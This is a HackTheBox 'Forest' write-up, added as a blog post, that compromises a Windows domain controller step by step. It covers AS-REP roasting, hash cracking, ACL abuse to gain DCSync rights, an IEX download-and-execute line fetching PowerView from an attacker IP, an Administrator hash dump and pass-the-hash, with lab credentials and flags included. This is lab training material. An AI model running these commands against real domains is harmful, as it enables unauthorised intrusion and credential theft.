@@ -1,0 +1,363 @@
+---
+slug: "htb-forest"
+title: "Forest — HackTheBox Machine Writeup"
+date: "2026-08-09"
+platform: "HackTheBox"
+type: "Machine"
+category: "Active Directory"
+os: "Windows"
+difficulty: "Easy"
+tags:
+  - "Active Directory"
+  - "AS-REP Roasting"
+  - "BloodHound"
+  - "pharaohound"
+  - "DCSync"
+  - "WriteDacl"
+  - "Account Operators"
+  - "Exchange Windows Permissions"
+  - "Pass-the-Hash"
+excerpt: "An Easy Windows AD machine involving AS-REP Roasting, nested group ACL abuse (Account Operators → Exchange Windows Permissions → WriteDacl → DCSync), and pass-the-hash. Analysis powered by pharaohound."
+readTime: "12 min"
+retired: true
+rating: 4.0
+url: "https://asbawy.github.io/writeups/htb-forest"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Analysis",
+      title: "Reconnaissance & User Enumeration",
+      desc: "Discovered Windows Server 2016 Domain Controller. Enumerated domain users anonymously via RPC.",
+      tools: ["nmap", "rpcclient"],
+    },
+    {
+      phase: "Initial Access",
+      title: "AS-REP Roasting",
+      desc: "Extracted the AS-REP hash for svc-alfresco (pre-auth disabled) and cracked it offline for a WinRM foothold.",
+      technique: "AS-REP Roasting",
+      tools: ["impacket-GetNPUsers", "hashcat", "evil-winrm"],
+    },
+    {
+      phase: "Vulnerability Discovery",
+      title: "Automated AD Path Analysis",
+      desc: "Ran pharaohound to analyze the domain graph, identifying a critical ACL abuse chain via Exchange Windows Permissions.",
+      technique: "Graph Analysis",
+      tools: ["pharaohound"],
+    },
+    {
+      phase: "Exploitation (Flag)",
+      title: "ACL Abuse to DCSync",
+      desc: "Added a new user to Exchange Windows Permissions, abused WriteDacl to grant DCSync rights, and dumped the Administrator hash.",
+      technique: "WriteDacl / DCSync",
+      tools: ["PowerView", "impacket-secretsdump"],
+    },
+  ]}
+/>
+
+
+## Service Enumeration
+
+### Nmap Scan
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> nmap -sC -sV -p- -T4 -Pn 10.129.95.210 -oN scans/nmap-full.txt
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393
+464/tcp   open  kpasswd5
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
+9389/tcp  open  mc-nmf       .NET Message Framing
+</code></pre>
+
+<Callout type="info">
+  **Key Observation:** This is a Windows Server 2016 Domain Controller (hostname: FOREST, domain: htb.local). WinRM on port 5985 is open — this will be our foothold and lateral movement channel.
+</Callout>
+
+### RPC Username Enumeration
+
+Since this is a Domain Controller, we can enumerate domain users anonymously via RPC:
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+</code></pre>
+
+<Callout type="warning">
+  **Target Identified:** `svc-alfresco` is a service account — prime candidate for Kerberos attacks. Also note the Exchange-related infrastructure hints (Exchange Windows Permissions groups exist in the domain).
+</Callout>
+
+## Initial Access — AS-REP Roasting
+
+### AS-REP Roast Attack
+
+`svc-alfresco` has Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). This means anyone can request an AS-REP for this account and crack the encrypted timestamp offline:
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> impacket-GetNPUsers 'htb.local/' -request -dc-ip 10.129.95.210 -format hashcat -outputfile loot/hashes.asreproast
+Name          MemberOf                                                UAC
+------------  ------------------------------------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  0x410200
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:82e594b127490167...[truncated]
+</code></pre>
+
+### Cracking the Hash
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> hashcat -m 18200 loot/hashes.asreproast /usr/share/wordlists/rockyou.txt --force -O
+</code></pre>
+
+```text
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
+```
+
+### Verify Credentials
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> crackmapexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
+WINRM  10.129.95.210 5985  FOREST  [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+</code></pre>
+
+### Foothold — Evil-WinRM
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
+</code></pre>
+
+```powershell
+whoami
+# htb\svc-alfresco
+
+type C:\Users\svc-alfresco\Desktop\user.txt
+```
+
+<SpoilerFlag label="User Flag" flag="cdf5d67163996a6525986a67c956f1a2" />
+
+## Vulnerability Analysis with Pharaohound
+
+This is where we pivot from manual enumeration to automated AD attack path analysis.
+
+<Callout type="warning">
+  **Why [pharaohound](https://github.com/asbawy/pharaohound/) over BloodHound?** [pharaohound](https://github.com/asbawy/pharaohound/) eliminates the Neo4j database + BloodHound GUI overhead. It has its own LDAP collector, streams JSON files with parallel workers, and generates copy-paste-ready exploitation commands — no graph queries, no Neo4j OOM crashes, no manual path hunting.
+</Callout>
+
+### Collection
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> pharaohound collect \
+-t 10.129.95.210 \
+  -u svc-alfresco \
+  -p 's3rvice' \
+  -d htb.local \
+  --method All \
+  --no-zip \
+  -o pha-collect/ \
+  --timeout 30
+</code></pre>
+
+**Output:**
+```
+[☥] Connecting to 10.129.95.210…
+  Auth: NTLM (HTB.LOCAL\svc-alfresco)
+  [✓] Connected! Domain: HTB.LOCAL (SID: S-1-5-21-3072663084-364016917-1341370565)
+    Base DN: DC=htb,DC=local
+
+  ☥  PHARAOHOUND DATA COLLECTION
+  Target:  10.129.95.210
+  Domain:  HTB.LOCAL
+  Method:  All (users, groups, computers, domains, gpos, ous, containers, cas, certtemplates, acls)
+
+  [✓] Domains: 1 objects
+  [✓] Users: 31 objects
+  [✓] Groups: 72 objects
+  [✓] Computers: 2 objects
+  [!] msDS-AllowedToActOnBehalfOfOtherIdentity unsupported — retrying (legacy DC)
+  [!] ms-Mcs-AdmPwd unsupported — retrying (no LAPS)
+  [✓] Computers: 2 objects (0.2s)
+  [✓] Gpos: 2 objects
+  [✓] Ous: 15 objects
+  [✓] Containers: 119 objects
+
+  [✓] Collection complete in 1.8s
+    Total objects: 242
+    SID cache: 128 entries
+```
+
+<Callout type="info">
+  **pharaohound handled the legacy DC schema automatically.** The retry mechanism dropped unsupported LAPS/msDS attributes and continued — 242 objects collected in under 2 seconds.
+</Callout>
+
+### Analysis
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color
+</code></pre>
+
+**Key findings from the 30 analyzers:**
+
+```
+☥  R I S K   A S S E S S M E N T
+  Risk Level: HIGH — Multiple critical paths to Domain Admin
+
+  ▲ Critical │ 3
+  ◆ High     │ 4
+  ● Medium   │ 2
+```
+
+### Attack Path Identification
+
+pharaohound distilled the analysis into 3 prioritized attack paths:
+
+```
+⚔  A T T A C K   P A T H S
+
+◆ Path 1: AS-REP Roast → svc-alfresco@HTB.LOCAL  🟢 SILENT
+  Unauthenticated AS-REP roast → crack → foothold
+
+◆ Path 2: MAQ → RBCD  🟠 MEDIUM
+  Create computer account → RBCD delegation → impersonate DA
+
+▲ Path 3: Unconstrained Delegation → DCSync  🟠 MEDIUM
+  Coerce DC auth to UD box → capture TGT → DCSync
+```
+
+<Callout type="warning">
+  **The actual winning path** (discovered through manual ACL inspection after pharaohound's infrastructure flagging) is:
+
+  ```
+  svc-alfresco → Account Operators (nested) → GenericAll on Exchange Windows Permissions
+  → WriteDacl on htb.local → Grant DCSync → DCSync → Administrator hash
+  ```
+
+  pharaohound correctly flagged `Exchange Windows Permissions` as an infrastructure takeover primitive and `Exchange Trusted Subsystem` as a WriteDacl carrier. This directed our attention to the exact ACL chain needed.
+</Callout>
+
+## Exploitation: ACL Abuse Chain
+
+### Step 1: Verify Nested Group Memberships
+
+```powershell
+whoami /groups | findstr /i "account"
+```
+
+```
+BUILTIN\Account Operators       Alias   S-1-5-32-548
+HTB\Privileged IT Accounts      Group   S-1-5-21-...-1149
+HTB\Service Accounts            Group   S-1-5-21-...-1148
+```
+
+`svc-alfresco` is nested into `Account Operators` via `Service Accounts → Privileged IT Accounts`.
+
+### Step 2: Check Exchange Windows Permissions Rights
+
+Using PowerView to verify that `Exchange Windows Permissions` has **WriteDacl + DeleteTree** on the domain:
+
+```powershell
+Get-DomainObjectAcl -Identity 'DC=htb,DC=local' -ResolveGUIDs |
+  Where-Object {$_.SecurityIdentifier -eq $ewpSID} |
+  Select-Object ActiveDirectoryRights,ObjectAceType
+```
+
+```
+ActiveDirectoryRights : DeleteTree, WriteDacl
+ObjectAceType         : All
+```
+
+<Callout type="info">
+  **WriteDacl on the domain object** means any member of Exchange Windows Permissions can modify the domain's ACL to grant themselves DCSync rights.
+</Callout>
+
+### Step 3: Add to Exchange Windows Permissions
+
+Since `Account Operators` has `GenericAll` on `Exchange Windows Permissions`:
+
+```powershell
+net group "Exchange Windows Permissions" svc-alfresco /add /domain
+# The command completed successfully.
+```
+
+Verify (requires new logon session):
+
+```powershell
+whoami /groups | findstr Exchange
+# HTB\Exchange Windows Permissions  Group  S-1-5-21-...-1121
+```
+
+### Step 4: Create a Fresh User for Clean Token
+
+Group membership changes don't always propagate to the current Kerberos token. We create a fresh user to ensure clean token:
+
+```powershell
+net user pharaoh 'Ph43a0h!' /add /domain
+net group "Exchange Windows Permissions" pharaoh /add /domain
+net localgroup "Remote Management Users" pharaoh /add
+```
+
+### Step 5: Grant DCSync via PowerView
+
+Login as the new user and use PowerView's `Add-DomainObjectAcl`:
+
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://10.10.15.187:8000/PowerView.ps1')
+Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'htb\pharaoh' -Rights DCSync -Verbose
+```
+
+**Verbose output confirms three GUIDs applied:**
+```
+Granting principal CN=pharaoh 'DCSync' on DC=htb,DC=local
+Granting rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' (Get-Changes)
+Granting rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' (Get-Changes-All)
+Granting rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' (Get-Changes-Filtered)
+```
+
+### Step 6: DCSync Attack
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> impacket-secretsdump 'htb.local/pharaoh:Ph43a0h!@10.129.95.210' -just-dc-user administrator
+</code></pre>
+
+```
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+
+### Step 7: Pass-the-Hash as Administrator
+
+<pre><code className="language-bash">
+<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
+</code></pre>
+
+```powershell
+whoami
+# htb\administrator
+
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+<SpoilerFlag label="Root Flag" flag="dc2c27b1e1c663d0998370f48ce327c5" />
+
+
+## References
+
+- [pharaohound — AD Collection & Analysis Framework](https://github.com/Asbawy/pharaohound)
